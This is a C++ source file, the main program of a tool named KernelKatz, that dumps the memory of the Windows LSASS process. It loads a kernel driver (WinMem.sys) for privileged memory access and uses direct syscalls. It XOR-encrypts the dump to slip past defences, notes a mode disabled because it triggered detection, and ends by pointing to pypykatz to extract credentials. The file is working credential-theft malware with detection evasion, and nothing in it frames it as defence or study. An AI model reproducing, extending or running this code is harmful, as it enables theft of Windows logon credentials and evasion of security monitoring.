#include <windows.h>
#include <bcrypt.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <cstdio>
#include <cwchar>

#include "core/log.h"
#include "core/syscall.h"
#include "driver/driver.h"
#include "engine/dmengine.h"
#include "dump/hybrid.h"

struct Args {
    wchar_t  output[MAX_PATH] = L"";
    bool     recon      = false;
    bool     encrypt    = true;
    bool     have_ntos  = false;
    bool     have_tramp = false;
    uint64_t ntos       = 0;
    uint64_t tramp      = 0;
    bool     help       = false;
    uint64_t probe      = 0;
    int      type       = 3;

};

static uint64_t parse_hex(const wchar_t* s) noexcept {
    if (s[0] == L'0' && (s[1] == L'x' || s[1] == L'X')) s += 2;
    return wcstoull(s, nullptr, 16);
}

static Args parse_args() noexcept {
    Args a{};
    int argc = 0;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (!argv) return a;

    for (int i = 1; i < argc; i++) {
        const wchar_t* s = argv[i];
        auto next = [&](wchar_t* dst, size_t n) -> bool {
            if (i + 1 >= argc) return false;
            wcscpy_s(dst, n, argv[++i]);
            return true;
        };
        if (!_wcsicmp(s, L"-o") || !_wcsicmp(s, L"--output"))
            next(a.output, MAX_PATH);
        else if (!_wcsicmp(s, L"--recon"))
            a.recon = true;
        else if (!_wcsicmp(s, L"--no-encrypt"))
            a.encrypt = false;
        else if (!_wcsicmp(s, L"--ntos-base") && i + 1 < argc) {
            a.ntos = parse_hex(argv[++i]); a.have_ntos = true;
        } else if (!_wcsicmp(s, L"--trampoline") && i + 1 < argc) {
            a.tramp = parse_hex(argv[++i]); a.have_tramp = true;
        } else if (!_wcsicmp(s, L"-h") || !_wcsicmp(s, L"--help"))
            a.help = true;
        else if (!_wcsicmp(s, L"--probe") && i + 1 < argc)
            a.probe = parse_hex(argv[++i]);
        else if (!_wcsicmp(s, L"--type") && i + 1 < argc)
            a.type = static_cast<int>(_wtoi(argv[++i]));
    }
    LocalFree(argv);
    return a;
}

static void usage() noexcept {
    log_inf("usage: KernelKatz.exe [-o out.enc] [--recon] [--no-encrypt]");
    log_inf("                     [--ntos-base HEX --trampoline HEX] [--probe HEX]");
    log_inf("  --recon        discover ntos base + trampoline PA, print, exit");
    log_inf("  --probe HEX    query a VA in LSASS (state/protect) and exit");
    log_inf("  --type 1       DESATIVADO neste build (ver main.cpp)");
    log_inf("  --ntos-base /  precomputed values from a --recon run (skips");
    log_inf("  --trampoline   kernel discovery - split execution mode)");
}

static BOOL WINAPI ctrl_handler(DWORD) {
    nx::close_driver();
    return FALSE;
}

static uint32_t find_lsass_pid() noexcept {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe{ sizeof pe };
    uint32_t pid = 0;
    for (BOOL ok = Process32FirstW(snap, &pe); ok && !pid;
         ok = Process32NextW(snap, &pe))
        if (!_wcsicmp(pe.szExeFile, L"lsass.exe"))
            pid = pe.th32ProcessID;
    CloseHandle(snap);
    return pid;
}

static bool is_elevated() noexcept {
    HANDLE t = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &t)) return false;
    TOKEN_ELEVATION el{};
    DWORD ret = 0;
    BOOL ok = GetTokenInformation(t, TokenElevation, &el, sizeof el, &ret);
    CloseHandle(t);
    return ok && el.TokenIsElevated;
}

int main() {
    Args args = parse_args();
    if (args.help) { usage(); return 0; }
    if (args.type == 1) {
        log_inf("--type 1 desativado neste build (codigo comentado em main.cpp)");
        log_inf("motivo: red flags - Sysmon Event 10, EPROCESS tampering, 21k+ NtReadVirtualMemory");
        return 1;
    }

    nx::enable_priv();
    if (!is_elevated())
        log_inf("not elevated - driver load will likely fail");

    nx::init_syscalls();

    SetConsoleCtrlHandler(ctrl_handler, TRUE);

    uint32_t lsass_pid = find_lsass_pid();
    if (!lsass_pid) {
        log_err("lsass.exe not found");
        return 1;
    }
    log_ok("lsass.exe PID = {}", lsass_pid);

    if (!nx::open_driver()) {
        if (!nx::load_driver() || !nx::open_driver()) {
            log_err("driver unavailable - drop WinMem.sys next to the binary");
            return 1;
        }
    }
    log_ok("WinMem driver open");

    dm::Engine eng;
    bool eng_ok = (args.have_ntos && args.have_tramp)
        ? eng.init_precomputed(args.ntos, args.tramp)
        : eng.init();
    if (!eng_ok) {
        log_err("engine init failed");
        nx::close_driver();
        return 1;
    }

    if (args.recon) {
        log_ok("recon complete. Dump run:");
        log_inf("  KernelKatz.exe --ntos-base {:X} --trampoline {:X}",
                eng.ntos_base(), eng.trampoline_pa());
        nx::close_driver();
        return 0;
    }

    dump::DumpBuffer buf{};
    HANDLE lsass_h = nullptr;
    uint64_t peb = 0;

    {
        lsass_h = eng.open_process(lsass_pid);
        if (!lsass_h) {
            log_err("open_process failed");
            nx::close_driver();
            return 1;
        }

        uint64_t cr3 = eng.get_cr3(lsass_pid);
        if (!cr3) {
            log_err("get_cr3 failed");
            CloseHandle(lsass_h);
            nx::close_driver();
            return 1;
        }

        if (args.probe) {
            nx::MBI mbi{};
            size_t ret = 0;
            NTSTATUS s = nx::NtQueryVirtualMemory_syscall(
                lsass_h, args.probe, 0, &mbi, sizeof mbi, &ret);
            if (NT_SUCCESS(s) && ret)
                log_inf("probe 0x{:X}: base=0x{:X} size=0x{:X} state=0x{:X} "
                        "protect=0x{:X} type=0x{:X}",
                        args.probe, mbi.base_address, mbi.region_size,
                        mbi.state, mbi.protect, mbi.type);
            else
                log_inf("probe 0x{:X}: NtQueryVirtualMemory -> 0x{:08X}",
                        args.probe, static_cast<uint32_t>(s));
            CloseHandle(lsass_h);
            nx::close_driver();
            return 0;
        }

        peb = eng.get_peb(lsass_pid);
        if (!peb)
            log_inf("get_peb failed — module list will be empty");

        if (!dump::dump_lsass(lsass_h, lsass_pid, cr3, peb, buf)) {
            log_err("dump failed");
            CloseHandle(lsass_h);
            nx::close_driver();
            return 1;
        }
        CloseHandle(lsass_h);
    }
    log_ok("dump complete  {:.1f} MB",
           static_cast<double>(buf.size) / (1024 * 1024));

    uint8_t key = 0;
    if (args.encrypt) {
        BCryptGenRandom(nullptr, &key, sizeof key, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        if (!key) key = 0x55;
        dump::xor_encrypt(buf, key);
    }

    wchar_t path[MAX_PATH];
    if (args.output[0]) {
        wcscpy_s(path, args.output);
    } else {
        wchar_t computer[256] = {};
        DWORD csz = 256;
        if (!GetComputerNameW(computer, &csz)) wcscpy_s(computer, L"host");
        uint32_t rnd = 0;
        BCryptGenRandom(nullptr, reinterpret_cast<PUCHAR>(&rnd), sizeof rnd,
                        BCRYPT_USE_SYSTEM_PREFERRED_RNG);
        swprintf(path, MAX_PATH, L".\\%ls-%08X.%ls", computer, rnd,
                 args.encrypt ? L"enc" : L"dmp");
    }

    char path_a[MAX_PATH];
    snprintf(path_a, sizeof path_a, "%ls", path);
    if (!dump::write_file(buf, path_a)) {
        log_err("write failed: {}", path_a);
        buf.free();
        nx::close_driver();
        return 1;
    }
    log_ok("{} written{}", path_a, args.encrypt ? " (XOR encrypted)" : "");

    buf.free();
    nx::close_driver();

    if (args.encrypt)
        log_inf("decrypt: python decrypt.py {} 0x{:02X}", path_a, key);
    else
        log_inf("parse: pypykatz lsa minidump {}", path_a);
    return 0;
}
